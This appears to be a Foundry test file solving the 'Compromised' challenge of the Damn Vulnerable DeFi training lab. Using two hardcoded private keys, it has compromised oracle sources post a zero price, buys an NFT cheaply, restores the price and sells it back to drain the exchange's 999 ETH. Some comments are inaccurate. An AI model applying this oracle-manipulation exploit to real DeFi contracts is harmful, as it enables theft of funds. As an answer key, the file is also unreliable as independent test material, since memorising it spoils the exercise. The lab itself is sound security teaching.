// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

import {AccessControlEnumerable} from "@openzeppelin/contracts/access/extensions/AccessControlEnumerable.sol";

contract CompromisedChallenge is Test, AccessControlEnumerable {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;

    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];
    uint256[] newPrices = [PLAYER_INITIAL_ETH_BALANCE, PLAYER_INITIAL_ETH_BALANCE, PLAYER_INITIAL_ETH_BALANCE];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0)); // ownership renounced
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_compromised() public checkSolved {
        bytes32 role = keccak256("TRUSTED_SOURCE_ROLE");

        uint256 priavetKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
        uint256 priavetKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;

        vm.prank(vm.addr(priavetKey1));
        oracle.postPrice("DVNFT", 0);

        vm.prank(vm.addr(priavetKey2));
        oracle.postPrice("DVNFT", 0);

        // Check that the median price is now 0
        console.log("Oracle price set to", oracle.getMedianPrice("DVNFT"));

        // Player buys the NFT for 0 ETH
        vm.startPrank(player);
        uint256 nftId = exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
        console.log("Player bought NFT with ID", nftId);
        console.log("Player's remaining ETH balance", player.balance);
        vm.stopPrank();

        // roleback the manipulated median price to the initial price by renouncing the role

        vm.startPrank(vm.addr(priavetKey1));
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();

        vm.startPrank(vm.addr(priavetKey2));
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();

        // Check that the median price is back to the initial price
        console.log("Oracle price restored to", oracle.getMedianPrice("DVNFT"));

        // Player approves the exchange to transfer the NFT
        vm.startPrank(player);
        nft.approve(address(exchange), nftId);

        // Player sells the NFT for 0 ETH
        exchange.sellOne(nftId);
        console.log("Player sold NFT with ID", nftId);

        // Player send the ETH to the recovery account
        recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
        console.log("Player sent ETH to recovery account"); 
        vm.stopPrank();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
